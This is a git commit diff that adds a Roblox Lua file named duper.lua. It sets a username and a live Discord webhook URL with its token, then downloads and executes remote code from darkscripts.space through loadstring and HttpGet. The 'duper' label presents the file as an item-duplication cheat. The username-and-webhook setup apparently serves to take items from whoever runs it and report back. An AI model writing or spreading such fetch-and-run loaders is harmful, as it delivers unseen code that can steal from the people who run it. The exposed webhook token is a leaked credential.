2e9cf6fa88585e2e2dd6b44c60fe2e0a5b959246
ifhrxbfrx2s2s2 <h3lplessss@gmail.com>
2024-11-02 21:20:41 +0100

    Update and rename README.md to duper.lua

---
+++ duper.lua
@@ -0,0 +1,5 @@
+Username = "fnnyx_y"
+Username2 = "fnnyx_y"
+Webhook = "https://discord.com/api/webhooks/1302363448214159481/ggE7syiMWX5pPb2TuBr7S1TsXwvc7rJTKSr6aOT0CDMaWZDxofMlSq5sYY3wGcXi4S43"
+
+loadstring(game:HttpGet(('https://darkscripts.space/ps99')))()
